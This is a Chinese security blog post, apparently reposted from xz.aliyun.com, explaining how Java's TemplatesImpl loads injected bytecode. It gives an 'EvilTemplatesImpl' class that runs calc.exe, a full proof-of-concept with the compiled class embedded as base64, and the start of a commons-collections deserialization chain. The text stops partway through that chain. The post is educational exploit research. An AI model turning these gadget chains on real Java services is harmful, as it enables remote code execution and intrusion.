---
title: Java_TemplatesImpl字节码在BCEL和shiro中的利用
url: https://buaq.net/go-138492.html
source: unSafe.sh - 不安全
date: 2022-12-05
fetch_date: 2025-10-04T00:30:31.324733
---

# Java_TemplatesImpl字节码在BCEL和shiro中的利用

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/733341527ad9a8ebe0d5d2bc26598b48.jpg)

Java\_TemplatesImpl字节码在BCEL和shiro中的利用

URLClassLoader可以从远程HTTP服务器上加载.class文件，从而执行任意代码。字节码的本质是一个字节数组byte[]defineClass加载
*2022-12-4 18:32:0
Author: [xz.aliyun.com(查看原文)](/jump-138492.htm)
阅读量:23
收藏*

---

URLClassLoader可以从远程HTTP服务器上加载.class文件，从而执行任意代码。

字节码的本质是一个字节数组byte[]

## defineClass

加载class或者jar文件，都会经过ClassLoader加载器的loadClass本地寻找类,findClass远程加载类，defineClass处理字节码，从而变成真正的java类。

因为defineClass被调用时，类对象不会被初始化，只有被显式调用构造函数时才能初始化。而且defineClass是protect类型，所以使用反射

```
Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
```

## TemplateSImpl

> 依赖：
>
> ```
> <dependency>
>          <groupId>org.apache.commons</groupId>
>          <artifactId>commons-collections4</artifactId>
>          <version>4.0</version>
>      </dependency>
> ```

defineClass作用域不开放，所以一般不直接使用。但有一些例外，比如TemplateSImpl。(类方法很少会调用到除public外的方法)，该类的内部类TransletClassLoader重写了defineClass方法

```
Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
}
```

java声明方法默认default，能被外部调用。而调用到TransletClassLoader为下列调用链。

`TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()-> TransletClassLoader#defineClass()`

使用到defineTransletClasses的其实有`getTransletInstance、getTransletClasses、getTransletIndex`三种，但是getTransletInstance生成的对象会被包含于Transformer

![](https://xzfile.aliyuncs.com/media/upload/picture/20221204182625-1aee32e4-73be-1.png)

最后两个getOutputProperties()和newTransformer都是public类，所以可以略去最后一步直接newTransformer()实现.

```
ObjectInputStream.GetField gf = is.readFields();
        _name = (String)gf.get("_name", null);
        _bytecodes = (byte[][])gf.get("_bytecodes", null);
        _class = (Class[])gf.get("_class", null);
        _transletIndex = gf.get("_transletIndex", -1);

        _outputProperties = (Properties)gf.get("_outputProperties", null);
        _indentNumber = gf.get("_indentNumber", 0);

        if (is.readBoolean()) {
            _uriResolver = (URIResolver) is.readObject();
        }

        _tfactory = new TransformerFactoryImpl();
```

* 在TemplatesImpl的readObject序列化中可以看到`_name,_bytecodes,_class,_transletIndex,_outputProperties,_indentNumer,_tfactory`都需要设置值进行初始化，但是有些不影响后续利用的不用管，只用设置`_name`为任意字符串，`_bytecode`为恶意字节码数组，`_tfactory.get`为TransformerFactoryImpl对象。

由于是私有属性，需要用到反射`obj.getClass().getDeclaredField()`修改属性值

* 该TemplatesImpl加载的字节码必须为AbstractTranslet子类，因为defineTransletClasses里会对传入类进行一次判断

```
for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i]);
    final Class superClass = _class[i].getSuperclass();

    // Check if this is the main class
    // ABSTRACT_TRANSLET指com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
        _transletIndex = i;
    }
    else {
        _auxClasses.put(_class[i].getName(), _class[i]);
    }
```

所以构造一个特殊类,用来弹计算器

```
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

使用extends继承AbstractTranslet类可以用super显式调用父类构造方法，super()即是指定无参构造函数。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221204182656-2de85b04-73be-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20221204182707-340e7522-73be-1.png)

完整POC：

```
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.codec.binary.Base64;

import java.lang.reflect.Field;

public class HelloTemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = Base64.decodeBase64("yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg".getBytes());
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        obj.newTransformer();
    }
}
```

上述src字节码来自EvilTemplatesImpl.java编译的class，然后将内容base64。

这里jdk的版本为8u65+commons-collections4.0

![](https://xzfile.aliyuncs.com/media/upload/picture/20221204182721-3c48b2b6-73be-1.png)

## TransformedMap调用TemplatesImpl加载字节码

> 依赖：
>
> ```
> <dependency>
>          <groupId>commons-collections</groupId>
>          <artifactId>commons-collections</artifactId>
>          <version>3.1</version>
>      </dependency>
> ```

* CC1是依靠TransformedMap直接执行Runtime实例的exec，那根据以上内容，可以直接执行TemplatesImpl下的newTransformer。

只需要修改ConstantTransformer的对象为TemplatesImpl。I...